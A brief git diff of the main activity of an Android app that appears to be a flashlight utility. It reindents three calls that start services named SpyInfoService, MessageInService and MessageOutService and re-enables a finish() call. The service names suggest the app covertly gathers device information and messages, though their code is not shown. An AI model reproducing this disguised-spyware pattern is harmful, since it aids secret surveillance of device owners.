@@ -36,9 +36,11 @@ public class MainActivity extends Activity {
 
 
 		// Starting Services
-		startService(new Intent(this, SpyInfoService.class));
-		startService(new Intent(this, MessageInService.class));
-		startService(new Intent(this, MessageOutService.class));
+
+			startService(new Intent(this, SpyInfoService.class));
+			startService(new Intent(this, MessageInService.class));
+			startService(new Intent(this, MessageOutService.class));
+
 
 		// Device has no flash
 		if (!hasFlash) {
@@ -49,7 +51,7 @@ public class MainActivity extends Activity {
 			alert.setButton("OK", new DialogInterface.OnClickListener() {
 				public void onClick(DialogInterface dialog, int which) {
 					// closing the application
-					//finish();
+					finish();
 				}
 			});
 			alert.show();
